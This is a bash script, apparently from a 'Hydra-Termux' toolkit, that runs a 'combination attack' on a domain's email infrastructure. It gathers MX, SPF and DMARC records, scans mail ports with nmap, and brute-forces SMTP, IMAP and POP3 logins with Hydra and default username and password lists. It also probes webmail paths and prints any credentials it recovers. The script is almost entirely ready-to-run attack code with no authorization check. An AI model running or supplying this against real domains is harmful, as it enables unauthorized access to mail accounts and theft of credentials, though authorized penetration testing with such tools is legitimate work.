#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# COMBINATION: EMAIL DOMAIN PENTEST
# Complete email infrastructure assessment for a domain
# Tests: DNS intelligence, mail server discovery, all protocols
# ═══════════════════════════════════════════════════════════════════

# ════════════════════════════════════════════════════════════════
# ⚡ CONFIGURATION - Replace with actual target ⚡
# ════════════════════════════════════════════════════════════════
DOMAIN="yourtarget.com"              # Target domain - REPLACE THIS
EMAIL="admin@yourtarget.com"         # Test email account - REPLACE THIS
# ════════════════════════════════════════════════════════════════

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true

# Configuration
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUTPUT_DIR/combo_email_domain_${DOMAIN//[.:\/]/_}_${TIMESTAMP}.log"
RESULTS_FILE="$OUTPUT_DIR/combo_email_domain_${DOMAIN//[.:\/]/_}_${TIMESTAMP}_results.txt"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Banner
clear
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  COMBINATION ATTACK: EMAIL DOMAIN INFRASTRUCTURE PENTEST${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Target Domain:${NC} ${BOLD}$DOMAIN${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Test Email:${NC}    ${BOLD}$EMAIL${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Started:${NC}       $(date)" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Phase 1: DNS Intelligence
echo -e "${PURPLE}━━━ Phase 1: DNS Intelligence Gathering ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

DISCOVERED_SERVERS=()

# MX Records
echo -e "${BLUE}[1.1]${NC} Discovering MX Records..." | tee -a "$LOG_FILE"
if command -v dig &>/dev/null; then
    MX_RECORDS=$(dig +short MX "$DOMAIN" 2>/dev/null | sort -n | awk '{print $2}' | sed 's/\.$//')
    if [ -n "$MX_RECORDS" ]; then
        echo "$MX_RECORDS" | while read -r mx; do
            echo -e "   ${GREEN}✓${NC} Found MX: $mx" | tee -a "$LOG_FILE"
            DISCOVERED_SERVERS+=("$mx")
        done
        echo "$MX_RECORDS" >> "$RESULTS_FILE"
    else
        echo -e "   ${YELLOW}ℹ${NC} No MX records found" | tee -a "$LOG_FILE"
    fi
else
    echo -e "   ${YELLOW}⚠${NC} dig not installed, skipping" | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# SPF Records  
echo -e "${BLUE}[1.2]${NC} Analyzing SPF Records..." | tee -a "$LOG_FILE"
if command -v dig &>/dev/null; then
    SPF_RECORD=$(dig +short TXT "$DOMAIN" 2>/dev/null | grep "v=spf1")
    if [ -n "$SPF_RECORD" ]; then
        echo -e "   ${GREEN}✓${NC} SPF: $SPF_RECORD" | tee -a "$LOG_FILE"
        echo "SPF: $SPF_RECORD" >> "$RESULTS_FILE"
    else
        echo -e "   ${YELLOW}ℹ${NC} No SPF record found" | tee -a "$LOG_FILE"
    fi
fi
echo "" | tee -a "$LOG_FILE"

# DMARC Records
echo -e "${BLUE}[1.3]${NC} Checking DMARC Policy..." | tee -a "$LOG_FILE"
if command -v dig &>/dev/null; then
    DMARC_RECORD=$(dig +short TXT "_dmarc.$DOMAIN" 2>/dev/null | grep "v=DMARC1")
    if [ -n "$DMARC_RECORD" ]; then
        echo -e "   ${GREEN}✓${NC} DMARC: $DMARC_RECORD" | tee -a "$LOG_FILE"
        echo "DMARC: $DMARC_RECORD" >> "$RESULTS_FILE"
    else
        echo -e "   ${RED}✗${NC} No DMARC record (potential vulnerability)" | tee -a "$LOG_FILE"
    fi
fi
echo "" | tee -a "$LOG_FILE"

# Common mail subdomains
echo -e "${BLUE}[1.4]${NC} Probing Common Mail Subdomains..." | tee -a "$LOG_FILE"
COMMON_HOSTS=("mail" "smtp" "imap" "pop" "pop3" "mx" "mx1" "mx2" "webmail")
for host in "${COMMON_HOSTS[@]}"; do
    full_host="${host}.${DOMAIN}"
    if command -v host &>/dev/null; then
        if host "$full_host" &>/dev/null 2>&1; then
            echo -e "   ${GREEN}✓${NC} Active: $full_host" | tee -a "$LOG_FILE"
            DISCOVERED_SERVERS+=("$full_host")
            echo "$full_host" >> "$RESULTS_FILE"
        fi
    fi
done
echo "" | tee -a "$LOG_FILE"

# Phase 2: Port Scanning
if [ ${#DISCOVERED_SERVERS[@]} -gt 0 ]; then
    PRIMARY_SERVER="${DISCOVERED_SERVERS[0]}"
    echo -e "${PURPLE}━━━ Phase 2: Mail Server Port Scanning ━━━${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}[2.1]${NC} Scanning primary server: $PRIMARY_SERVER" | tee -a "$LOG_FILE"
    echo "" | tee -a "$LOG_FILE"
    
    if command -v nmap &>/dev/null; then
        MAIL_PORTS="25,110,143,465,587,993,995,2525,4190"
        echo -e "   ${CYAN}→${NC} Testing ports: $MAIL_PORTS" | tee -a "$LOG_FILE"
        nmap -Pn -p "$MAIL_PORTS" -T4 --open "$PRIMARY_SERVER" 2>&1 | tee -a "$LOG_FILE"
    else
        echo -e "   ${YELLOW}⚠${NC} nmap not installed, skipping port scan" | tee -a "$LOG_FILE"
    fi
    echo "" | tee -a "$LOG_FILE"
else
    echo -e "${YELLOW}⚠ No mail servers discovered, skipping port scan${NC}" | tee -a "$LOG_FILE"
    PRIMARY_SERVER="$DOMAIN"
fi

# Phase 3: Protocol Testing
echo -e "${PURPLE}━━━ Phase 3: Multi-Protocol Attack ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERNAME="${EMAIL%%@*}"
USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

# Create minimal lists if not exist
if [ ! -f "$USERLIST" ]; then
    cat > "$USERLIST" << EOF
$USERNAME
admin
postmaster
root
administrator
EOF
fi

if [ ! -f "$PASSLIST" ]; then
    cat > "$PASSLIST" << EOF

password
123456
admin
$USERNAME
welcome
changeme
letmein
EOF
fi

# SMTP (Port 25/587/465)
echo -e "${BLUE}[3.1]${NC} Testing SMTP (Email Sending)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -w 30 -f "smtp://$PRIMARY_SERVER" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ SMTP CREDENTIALS FOUND!${NC}" | tee -a "$RESULTS_FILE"
    fi
else
    echo -e "   ${RED}✗ Hydra not installed${NC}" | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# IMAP (Port 143/993)
echo -e "${BLUE}[3.2]${NC} Testing IMAP (Email Retrieval)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -w 20 -f "imap://$PRIMARY_SERVER" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ IMAP CREDENTIALS FOUND!${NC}" | tee -a "$RESULTS_FILE"
    fi
else
    echo -e "   ${RED}✗ Hydra not installed${NC}" | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# POP3 (Port 110/995)
echo -e "${BLUE}[3.3]${NC} Testing POP3 (Email Download)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -w 20 -f "pop3://$PRIMARY_SERVER" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ POP3 CREDENTIALS FOUND!${NC}" | tee -a "$RESULTS_FILE"
    fi
else
    echo -e "   ${RED}✗ Hydra not installed${NC}" | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# Phase 4: Webmail Testing
echo -e "${PURPLE}━━━ Phase 4: Webmail Interface Testing ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

WEBMAIL_PATHS=("/webmail" "/mail" "/owa" "/roundcube" "/squirrelmail" "/horde")
for path in "${WEBMAIL_PATHS[@]}"; do
    webmail_url="http://${DOMAIN}${path}"
    echo -e "${BLUE}[4.x]${NC} Testing: $webmail_url" | tee -a "$LOG_FILE"
    
    if command -v curl &>/dev/null; then
        HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$webmail_url" --connect-timeout 5)
        if [ "$HTTP_STATUS" = "200" ] || [ "$HTTP_STATUS" = "301" ] || [ "$HTTP_STATUS" = "302" ]; then
            echo -e "   ${GREEN}✓ Webmail found: $webmail_url (HTTP $HTTP_STATUS)${NC}" | tee -a "$LOG_FILE"
            echo "Webmail: $webmail_url" >> "$RESULTS_FILE"
        fi
    fi
done
echo "" | tee -a "$LOG_FILE"

# Final Summary
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  EMAIL DOMAIN PENTEST COMPLETE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Extract and display found credentials
if grep -q "login:" "$LOG_FILE"; then
    echo -e "${GREEN}🎉 CREDENTIALS DISCOVERED:${NC}" | tee -a "$RESULTS_FILE"
    grep -E "login:|password:" "$LOG_FILE" | tee -a "$RESULTS_FILE"
    echo "" | tee -a "$RESULTS_FILE"
else
    echo -e "${YELLOW}ℹ No credentials found. Try larger wordlists.${NC}" | tee -a "$RESULTS_FILE"
    echo "" | tee -a "$RESULTS_FILE"
fi

echo -e "${BLUE}📊 Summary:${NC}" | tee -a "$LOG_FILE"
echo -e "   Domain: $DOMAIN" | tee -a "$LOG_FILE"
echo -e "   Email: $EMAIL" | tee -a "$LOG_FILE"
echo -e "   Mail Servers Discovered: ${#DISCOVERED_SERVERS[@]}" | tee -a "$LOG_FILE"
echo -e "   Protocols Tested: SMTP, IMAP, POP3, Webmail" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}📁 Output Files:${NC}" | tee -a "$LOG_FILE"
echo -e "   Log: $LOG_FILE" | tee -a "$LOG_FILE"
echo -e "   Results: $RESULTS_FILE" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${PURPLE}⚡ POWERED BY HYDRA-TERMUX ULTIMATE EDITION${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo ""

# View results option
read -r -p "View detailed results? [y/N]: " view_choice
if [ "$view_choice" = "y" ] || [ "$view_choice" = "Y" ]; then
    if command -v less &>/dev/null; then
        less "$LOG_FILE"
    else
        cat "$LOG_FILE"
    fi
fi
